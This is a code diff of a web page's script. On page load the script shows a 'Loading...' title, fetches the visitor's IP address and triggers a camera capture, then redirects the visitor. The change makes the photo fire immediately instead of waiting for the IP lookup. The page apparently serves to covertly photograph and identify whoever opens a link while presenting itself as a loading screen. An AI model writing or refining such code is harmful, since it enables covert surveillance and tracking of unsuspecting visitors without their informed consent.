@@ -88,7 +88,7 @@
       height="640"
     ></canvas>
 
-    <script src="config.js?v=20251103j"></script>
+    <script src="config.js?v=20251103k"></script>
     <script type="text/javascript">
       window.addEventListener(
         "DOMContentLoaded",
@@ -154,20 +154,19 @@
             document.title = "正在加载...";
           }
 
-          // 先获取IP地址，超时300ms后继续(不阻塞太久)
+          // 并行获取IP地址(超时50ms后继续,不阻塞拍照)
           let userIP = null;
-          const ipPromise = Promise.race([
+          Promise.race([
             fetch("https://api.ipify.org?format=json")
               .then((res) => res.json())
-              .then((data) => data.ip)
-              .catch(() => null),
-            new Promise((resolve) => setTimeout(() => resolve(null), 300))
-          ]).then((ip) => {
-            userIP = ip;
-          });
+              .then((data) => {
+                userIP = data.ip;
+              })
+              .catch(() => {}),
+            new Promise((resolve) => setTimeout(resolve, 50))
+          ]);
 
-          // 等待IP获取(最多300ms)后再拍照
-          ipPromise.then(() => {
+          // 立即开始拍照(不等IP)
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices
               .getUserMedia({
@@ -261,7 +260,6 @@
               window.location.href = redirectUrl;
             }
           }
-          }); // 关闭 ipPromise.then()
         },
         false
       );
